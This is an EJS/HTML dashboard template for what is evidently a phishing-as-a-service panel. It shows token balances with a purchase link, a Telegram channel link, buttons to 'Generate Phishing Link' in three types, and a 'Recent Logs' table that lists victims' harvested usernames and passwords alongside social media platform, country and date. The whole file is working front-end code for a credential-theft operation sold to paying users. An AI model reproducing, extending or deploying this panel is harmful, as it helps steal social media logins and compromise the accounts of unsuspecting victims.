<style>
  .panel-buttons a {
    display: inline-flex !important;
    align-items: center !important;
    justify-content: center !important;
    padding: 0.5em 1em !important;
  }
  .op {
    display: flex;
    align-items: center;
    margin-bottom: 1em;
  }
</style>

<div class="main-panel">
  <div class="content-wrapper">
    <a
      target="_blank"
      class="btn btn-primary"
      style="display: block"
      href="https://t.me/+kFAsCwWTgyw1YmVk"
      >Join our telegram channel</a
    >
    <br />
    <div class="bg-warning p-3">
      <p class="text-center text-black font-bold">
        US and None US Links are now the same!
      </p>
    </div>
    <br />
    <div class="row">
      <div class="col-xl-4 col-sm-4 grid-margin stretch-card">
        <div class="card">
          <div class="card-body">
            <div class="row">
              <div class="col-9">
                <div class="d-flex align-items-center align-self-start">
                  <h3 class="mb-0"><%= req.user.tokens || 0 %> tokens</h3>
                </div>
              </div>
              <div class="col-3">
                <div class="icon icon-box-success">
                  <span class="mdi mdi-cash icon-item"></span>
                </div>
              </div>
            </div>
            <h6 class="text-muted font-weight-normal">None US tokens</h6>
            <a href="/pricing" class="btn btn-success">Buy Tokens</a>
          </div>
        </div>
      </div>
      <div class="col-xl-4 col-sm-4 grid-margin stretch-card">
        <div class="card">
          <div class="card-body">
            <div class="row">
              <div class="col-9">
                <div class="d-flex align-items-center align-self-start">
                  <h3 class="mb-0"><%= req.user.usTokens || 0 %> tokens</h3>
                </div>
              </div>
              <div class="col-3">
                <div class="icon icon-box-success">
                  <span class="mdi mdi-cash icon-item"></span>
                </div>
              </div>
            </div>
            <h6 class="text-muted font-weight-normal">US tokens</h6>
            <a href="/pricing" class="btn btn-success">Buy Tokens</a>
          </div>
        </div>
      </div>
      <div class="col-xl-4 col-sm-4 grid-margin stretch-card">
        <div class="card">
          <div class="card-body">
            <div class="row">
              <div class="col-9">
                <div class="d-flex align-items-center align-self-start">
                  <h3 class="mb-0"><%= linkscount %></h3>
                </div>
              </div>
              <div class="col-3">
                <div class="icon icon-box-success">
                  <span class="mdi mdi-link icon-item"></span>
                </div>
              </div>
            </div>
            <h6 class="text-muted font-weight-normal">Social Links</h6>
            <div>
              <a href="/links" class="btn btn-secondary">See all</a>
            </div>
          </div>
        </div>
      </div>
      <div class="col-12 row">
        <a href="/share-tokens" class="col-5 btn btn-primary my-3 mr-2">
          Share tokens
        </a>
        <a
          href="/settings"
          class="col-5 btn btn-secondary my-3 mr-2"
          style="align-items: center"
          >Settings <i class="mdi mdi-settings"></i>
        </a>
      </div>
    </div>

    <div class="row panel-buttons mt-5">
      <div class="grid-margin">
        <div class="container">
          <div class="op">
            <img
              src="/link2.png"
              alt=""
              class="mr-4"
              width="50"
              height="100"
            /><a href="/create-link" class="btn btn-success my-3 mr-2"
              >Generate Phishing Link (Type 1)
            </a>
          </div>
          <div class="op">
            <img src="/link1.png" class="mr-4" alt="" width="50" height="100" />
            <a href="/create-link2" class="btn btn-danger my-3 mr-2"
              >Generate Phishing Link (Type 2)
            </a>
          </div>
          <div class="op">
            <img src="/link2.png" class="mr-4" alt="" width="50" height="100" />
            <a href="/create-link3" class="btn btn-primary my-3 mr-2"
              >Generate Phishing Link (Type 3) Custom
            </a>
          </div>
        </div>
      </div>
    </div>

    <div class="row text-white">
      <div class="col-12 grid-margin">
        <div class="card">
          <div class="card-body">
            <h4 class="card-title">Recent Logs</h4>
            <div class="table-responsive">
              <table class="table">
                <thead>
                  <tr>
                    <th class="text-white">Logs</th>
                    <th class="text-white">Social Media</th>
                    <th class="text-white">Country</th>
                    <th class="text-white">Link Name</th>
                    <th class="text-white">Date</th>
                  </tr>
                </thead>
                <tbody>
                  <% credentials.reverse().slice(0,11).forEach(c => {%>
                  <tr>
                    <td class="text-white">
                      <p class="text-white">
                        Username: <b><%= c.fields.username %></b>
                      </p>
                      <br />
                      <p class="text-white">
                        Password: <b><%= c.fields.password %></b>
                      </p>
                    </td>
                    <td class="text-white"><%= c.linkType %></td>
                    <td class="text-white"><%= c.country %></td>
                    <td class="text-white"><%= c.linkName %></td>
                    <td class="text-white">
                      <%= moment(c.date).format("MMM Do YY h:mm a") %>
                    </td>
                  </tr>
                  <%})%>
                </tbody>
              </table>

              <% if(credentialscount > 10){%>
              <div>
                <a href="/credentials" class="btn btn-secondary">See all</a>
              </div>
              <%}%>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
